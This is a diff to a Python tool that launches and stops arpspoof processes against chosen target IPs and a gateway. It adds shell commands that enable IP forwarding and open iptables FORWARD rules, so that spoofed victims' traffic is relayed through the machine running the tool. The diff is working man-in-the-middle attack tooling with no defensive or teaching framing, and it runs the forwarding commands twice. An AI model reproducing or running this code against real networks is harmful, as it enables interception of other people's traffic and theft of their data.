@@ -13,6 +13,17 @@ sniff_active_list = []
 # Dictionary to store IP addresses and their corresponding PIDs
 ip_pid_map = {}
 
+
+def port_forward_commands(target_ip, gateway_ip):
+    portforward_commands = [
+        f"echo 1 > /proc/sys/net/ipv4/ip_forward",
+        f"iptables -A FORWARD -s {gateway_ip} -d {target_ip} -j ACCEPT",
+        f"iptables -A FORWARD -s {target_ip} -d {gateway_ip} -j ACCEPT",
+        f"iptables -A FORWARD -j ACCEPT",
+    ]
+    return portforward_commands
+
+
 def arp_spoof_host_IPs(target_ip, gateway_ip, selected_interface):
     """
     Generate ARP spoofing commands to target a specific IP address.
@@ -34,25 +45,31 @@ def arp_spoof_host_IPs(target_ip, gateway_ip, selected_interface):
 
 def stop_arpspoof(ip_address):
     """
-    List all arpspoof and gnome-terminal processes, send CTRL+C to arpspoof processes.
-    """
-    print(ip_pid_map)
-    pids_for_ip = ip_pid_map[ip_address]
-    print("PIDs for 192.168.2.9:", pids_for_ip)
-    try:
-        # List all arpspoof processes
-        arpspoof_processes = subprocess.run(["pgrep", "arpspoof"], capture_output=True, text=True).stdout.splitlines()
-        for pid in arpspoof_processes:
-            print(f" (from stop_arpspoof) PID: {pid}")
-            # Send CTRL+C signal to the arpspoof process
-            try:
-                os.kill(int(pid), 2)  # Sending SIGINT signal (CTRL+C)
-                print(f"    Sent CTRL+C signal to process with PID {pid}")
-            except ProcessLookupError:
-                print(f"    Process with PID {pid} not found.")
+    Stop ARP spoofing for a given IP address.
 
-    except subprocess.CalledProcessError:
-        print("Failed to list processes.")
+    Args:
+        ip_address (str): The IP address for which ARP spoofing needs to be stopped.
+    """
+    global ip_pid_map
+    
+    # Check if the IP address has an associated ARP spoofing process
+    if ip_address in ip_pid_map:
+        pids_for_ip = ip_pid_map[ip_address]
+        
+        # Terminate ARP spoofing processes
+        for pid in pids_for_ip:
+            try:
+                # Send SIGINT signal (CTRL+C) to the ARP spoofing process
+                os.kill(int(pid), 2)
+                print(f"Sent CTRL+C signal to process with PID {pid}")
+            except ProcessLookupError:
+                print(f"Process with PID {pid} not found.")
+        
+        # Remove IP address entry from the IP-PID map
+        del ip_pid_map[ip_address]
+        print(f"ARP spoofing stopped for IP address {ip_address}")
+    else:
+        print(f"No ARP spoofing process found for IP address {ip_address}")
 
 
 def run_arpspoof(ip_address, gateway_ip, interface):
@@ -89,6 +106,23 @@ def run_arpspoof(ip_address, gateway_ip, interface):
             thread = threading.Thread(target=execute_command, args=(proc,))
             threads.append(thread)
             thread.start()
+
+        all_portforward_commands_succeeded = True
+
+        port_forwarding_commands = port_forward_commands(ip_address, gateway_ip)
+        for portforward_command in port_forwarding_commands:
+            subprocess.run(portforward_command, shell=True)
+
+        # Execute the portforward commands
+        for portforward_command in port_forwarding_commands:
+            result = subprocess.run(portforward_command, shell=True)
+            if result.returncode != 0:
+                all_portforward_commands_succeeded = False
+                print(f"\n\n[-] Error: Command '{portforward_command}' failed with return code {result.returncode}\n\n")
+
+        if all_portforward_commands_succeeded:
+            print("[+] All commands executed successfully.")
+
 
         # Wait for the threads to start before getting the PID
         time.sleep(1)
@@ -139,12 +173,4 @@ def check_sniffer_active(ip_address):
     with sniff_list_lock:
         # Check if the IP address is present in any active ARP spoofing process
         return any(ip_address in proc["ip_address"] for proc in sniff_list)
-
-# Example usage
-# threading.Thread(target=run_arpspoof, args=("192.168.2.9", "192.168.2.254", "eth0")).start()
-# # Start ARP spoofing for the second IP address after a delay
-# time.sleep(10)
-# threading.Thread(target=run_arpspoof, args=("192.168.2.14", "192.168.2.254", "eth0")).start()
-
-# print(sniff_list)
 
